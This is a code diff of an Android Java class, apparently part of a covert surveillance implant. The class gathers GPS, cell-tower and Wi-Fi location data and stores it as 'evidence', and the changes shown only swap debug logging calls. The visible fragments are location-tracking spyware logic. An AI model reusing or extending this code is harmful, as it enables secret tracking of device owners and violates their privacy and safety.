@@ -18,7 +18,6 @@ import android.location.LocationListener;
 import android.net.wifi.WifiInfo;
 import android.net.wifi.WifiManager;
 import android.os.Bundle;
-import android.util.Log;
 
 import com.android.service.CellInfo;
 import com.android.service.Device;
@@ -70,7 +69,7 @@ public class AgentPosition extends AgentBase implements LocationListener {
 		try {
 			locator.join();
 		} catch (InterruptedException e) {
-			if(Cfg.DEBUG) { e.printStackTrace(); }
+			if(Cfg.DEBUG) { Check.log(e); }
 		}
 		locator = null;
 	}
@@ -89,7 +88,7 @@ public class AgentPosition extends AgentBase implements LocationListener {
 				gpsEnabled = ((type & TYPE_GPS) != 0);
 			} else {
 
-				if(Cfg.DEBUG) Log.d("QZ", TAG + " Warn: " + "GPS Disabled at compile time");
+				if(Cfg.DEBUG) Check.log( TAG + " Warn: " + "GPS Disabled at compile time");
 
 			}
 			cellEnabled = ((type & TYPE_CELL) != 0);
@@ -100,11 +99,11 @@ public class AgentPosition extends AgentBase implements LocationListener {
 			// + type);
 
 
-			if(Cfg.DEBUG) Log.d("QZ", TAG + " Info: " + "Type: " + type);
-			if(Cfg.DEBUG) Log.d("QZ", TAG + " Info: " + "Period: " + period);
-			if(Cfg.DEBUG) Log.d("QZ", TAG + " Info: " + "gpsEnabled: " + gpsEnabled);
-			if(Cfg.DEBUG) Log.d("QZ", TAG + " Info: " + "cellEnabled: " + cellEnabled);
-			if(Cfg.DEBUG) Log.d("QZ", TAG + " Info: " + "wifiEnabled: " + wifiEnabled);
+			if(Cfg.DEBUG) Check.log( TAG + " Info: " + "Type: " + type);
+			if(Cfg.DEBUG) Check.log( TAG + " Info: " + "Period: " + period);
+			if(Cfg.DEBUG) Check.log( TAG + " Info: " + "gpsEnabled: " + gpsEnabled);
+			if(Cfg.DEBUG) Check.log( TAG + " Info: " + "cellEnabled: " + cellEnabled);
+			if(Cfg.DEBUG) Check.log( TAG + " Info: " + "wifiEnabled: " + wifiEnabled);
 
 
 			setPeriod(period);
@@ -112,7 +111,7 @@ public class AgentPosition extends AgentBase implements LocationListener {
 
 		} catch (final IOException e) {
 
-			if(Cfg.DEBUG) Log.d("QZ", TAG + " Error: " + e.toString());
+			if(Cfg.DEBUG) Check.log( TAG + " Error: " + e.toString());
 
 			return false;
 		}
@@ -124,25 +123,25 @@ public class AgentPosition extends AgentBase implements LocationListener {
 	public void go() {
 
 		if (Status.self().crisisPosition()) {
-			if(Cfg.DEBUG) Log.d("QZ", TAG + " Warn: " + "Crisis!");
+			if(Cfg.DEBUG) Check.log( TAG + " Warn: " + "Crisis!");
 			return;
 		}
 
 		if (gpsEnabled) {
 
-			if(Cfg.DEBUG) Log.d("QZ", TAG + " actualRun: gps");
+			if(Cfg.DEBUG) Check.log( TAG + " actualRun: gps");
 
 			locationGPS();
 		}
 		if (cellEnabled) {
 
-			if(Cfg.DEBUG) Log.d("QZ", TAG + " actualRun: cell");
+			if(Cfg.DEBUG) Check.log( TAG + " actualRun: cell");
 
 			locationCELL();
 		}
 		if (wifiEnabled) {
 
-			if(Cfg.DEBUG) Log.d("QZ", TAG + " actualRun: wifi");
+			if(Cfg.DEBUG) Check.log( TAG + " actualRun: wifi");
 
 			locationWIFI();
 		}
@@ -156,7 +155,7 @@ public class AgentPosition extends AgentBase implements LocationListener {
 
 		if (wifi != null && wifi.getBSSID() != null) {
 
-			if(Cfg.DEBUG) Log.d("QZ", TAG + " Info: " + "Wifi: " + wifi.getBSSID());
+			if(Cfg.DEBUG) Check.log( TAG + " Info: " + "Wifi: " + wifi.getBSSID());
 
 			final byte[] payload = getWifiPayload(wifi.getBSSID(),
 					wifi.getSSID(), wifi.getRssi());
@@ -170,7 +169,7 @@ public class AgentPosition extends AgentBase implements LocationListener {
 			// logWifi.close();
 		} else {
 
-			if(Cfg.DEBUG) Log.d("QZ", TAG + " Warn: " + "Wifi disabled");
+			if(Cfg.DEBUG) Check.log( TAG + " Warn: " + "Wifi disabled");
 
 		}
 
@@ -184,7 +183,7 @@ public class AgentPosition extends AgentBase implements LocationListener {
 
 		CellInfo info = Device.getCellInfo();
 		if (!info.valid) {
-			if(Cfg.DEBUG) Log.d("QZ", TAG + " Error: " + "invalid cell info");
+			if(Cfg.DEBUG) Check.log( TAG + " Error: " + "invalid cell info");
 			return;
 		}
 
@@ -202,24 +201,24 @@ public class AgentPosition extends AgentBase implements LocationListener {
 
 	private void locationGPS() {
 		if (locator == null) {
-			if(Cfg.DEBUG) Log.d("QZ", TAG + " Error: " + "GPS Not Supported on Device");
+			if(Cfg.DEBUG) Check.log( TAG + " Error: " + "GPS Not Supported on Device");
 			return;
 		}
 
 		if (lastLocation == null) {
-			if(Cfg.DEBUG) Log.d("QZ", TAG + " waitingForPoint");
+			if(Cfg.DEBUG) Check.log( TAG + " waitingForPoint");
 
 			return;
 		}
 
-		if(Cfg.DEBUG) Log.d("QZ", TAG + " newLocation");
+		if(Cfg.DEBUG) Check.log( TAG + " newLocation");
 
 
 		byte[] payload;
 		synchronized (this) {
 			final long timestamp = lastLocation.getTime();
 
-			if(Cfg.DEBUG) Log.d("QZ", TAG + " valid");
+			if(Cfg.DEBUG) Check.log( TAG + " valid");
 
 			payload = getGPSPayload(lastLocation, timestamp);
 			lastLocation = null;
@@ -242,7 +241,7 @@ public class AgentPosition extends AgentBase implements LocationListener {
 		if (location != null) {
 			double lat = location.getLatitude();
 			double lng = location.getLongitude();
-			if(Cfg.DEBUG) Log.d("QZ", TAG + " lat: " + lat + " lon:" + lng);
+			if(Cfg.DEBUG) Check.log( TAG + " lat: " + lat + " lon:" + lng);
 		}
 		synchronized (this) {
 			lastLocation = location;
@@ -289,7 +288,7 @@ public class AgentPosition extends AgentBase implements LocationListener {
 		if(Cfg.DEBUG) Check.requires(payload != null, "saveEvidence payload!= null");
 
 
-		if(Cfg.DEBUG) Log.d("QZ", TAG + " saveEvidence payload: " + payload.length);
+		if(Cfg.DEBUG) Check.log( TAG + " saveEvidence payload: " + payload.length);
 
 
 		final int version = 2008121901;
@@ -325,7 +324,7 @@ public class AgentPosition extends AgentBase implements LocationListener {
 	}
 
 	private byte[] getWifiPayload(String bssid, String ssid, int signalLevel) {
-		if(Cfg.DEBUG) Log.d("QZ", TAG + " getWifiPayload bssid: " + bssid + " ssid: " + ssid
+		if(Cfg.DEBUG) Check.log( TAG + " getWifiPayload bssid: " + bssid + " ssid: " + ssid
 				+ " signal:" + signalLevel);
 		final int size = 48;
 		final byte[] payload = new byte[size];
@@ -356,7 +355,7 @@ public class AgentPosition extends AgentBase implements LocationListener {
 			place[i] = ssidcontent[i];
 		}
 
-		if(Cfg.DEBUG) Log.d("QZ", TAG + " getWifiPayload ssidcontent.length: " + ssidcontent.length);
+		if(Cfg.DEBUG) Check.log( TAG + " getWifiPayload ssidcontent.length: " + ssidcontent.length);
 
 		databuffer.writeInt(ssidcontent.length);
 
@@ -424,7 +423,7 @@ public class AgentPosition extends AgentBase implements LocationListener {
 	 */
 	private byte[] getGPSPayload(Location loc, long timestamp) {
 
-		if(Cfg.DEBUG) Log.d("QZ", TAG + " getGPSPayload");
+		if(Cfg.DEBUG) Check.log( TAG + " getGPSPayload");
 
 		final Date date = new Date(timestamp);
 
@@ -436,7 +435,7 @@ public class AgentPosition extends AgentBase implements LocationListener {
 		final float speed = loc.getSpeed();
 		final float course = loc.getBearing();
 
-		if(Cfg.DEBUG) Log.d("QZ", TAG + " " + " " + speed + "|" + latitude + "|" + longitude + "|"
+		if(Cfg.DEBUG) Check.log( TAG + " " + " " + speed + "|" + latitude + "|" + longitude + "|"
 				+ course + "|" + date);
 
 		final DateTime dateTime = new DateTime(date);
@@ -493,7 +492,7 @@ public class AgentPosition extends AgentBase implements LocationListener {
 		databuffer.write(new byte[48]); // azimuth view
 		databuffer.write(new byte[48]); // sn view
 
-		if(Cfg.DEBUG) Log.d("QZ", TAG + " len: " + databuffer.getPosition());
+		if(Cfg.DEBUG) Check.log( TAG + " len: " + databuffer.getPosition());
 
 
 		if(Cfg.DEBUG) Check.ensures(databuffer.getPosition() == size,
